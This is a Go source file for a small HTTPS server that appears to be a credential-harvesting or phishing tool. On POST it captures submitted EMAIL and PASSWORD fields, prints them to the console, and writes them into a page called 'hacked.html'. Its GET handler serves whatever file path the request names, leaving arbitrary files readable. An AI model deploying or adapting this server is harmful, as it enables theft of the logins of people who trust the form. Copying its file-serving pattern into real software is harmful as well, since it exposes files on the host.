package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"strings"
)

func putData(r *http.Request) {
	data, err := ioutil.ReadFile("form.html")

	if err != nil {
		log.Fatal(err)
	}

	lines := strings.Split(string(data), "\n")

	for i, line := range lines {
		if strings.Contains(line, "EMAIL") {
			lines[i] = "<p>" + r.PostForm["EMAIL"][0] + "<p>"
		} else if strings.Contains(line, "PASSWORD") {
			lines[i] = "<p>" + r.PostForm["PASSWORD"][0] + "<p>"
		}
	}

	output := strings.Join(lines, "\n")
	err = ioutil.WriteFile("hacked.html", []byte(output), 0644)
	if err != nil {
		log.Fatal(err)
	}

}

func handleServer(w http.ResponseWriter, r *http.Request) {
	switch r.Method {
	case "GET":
		http.ServeFile(w, r, r.URL.Path[1:])
	case "POST":
		err := r.ParseForm()
		if err != nil {
			log.Fatal(err)
			return
		}
		fmt.Println(r.PostForm)
		putData(r)
		http.ServeFile(w, r, "hacked.html")
	}
}

func main() {
	fmt.Println("Please, contact me on port 4321!")
	http.HandleFunc("/", handleServer)
	log.Fatal(http.ListenAndServeTLS(":4321", "certA.crt", "privkeyA.pem", nil))
}
